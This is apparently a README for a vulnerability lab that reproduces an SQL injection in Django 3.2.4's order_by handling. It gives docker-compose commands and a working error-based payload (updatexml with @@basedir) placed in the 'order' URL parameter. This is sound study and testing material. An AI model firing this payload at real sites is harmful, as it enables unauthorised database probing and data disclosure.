The vulnerability requires the developer to use order_by function. Moreover, the input of the queryset can be controlled.

## Start Vulnerability Application

Compile and start a vulnerable Django 3.2.4 by executing the following command:

```
docker-compose build
docker-compose up -d
```

After the environment is started, you can see the home page of Django at `http://your-ip:8000`.

## Vulnerability Reproduce

First, go to the list-view `http://your-ip:8000/vuln/` and add `order=-id` to the GET parameter.

http://your-ip:8000/vuln/?order=-id

You will see the data sorted by id in descending order:

Add `order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@basedir)),1)%23` to the GET parameter, where `vuln` is your app and `collection` is the models.

`http://your-ip:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23`

You can see that the single bracket  has been injected successfully, and you can get the information from the error:
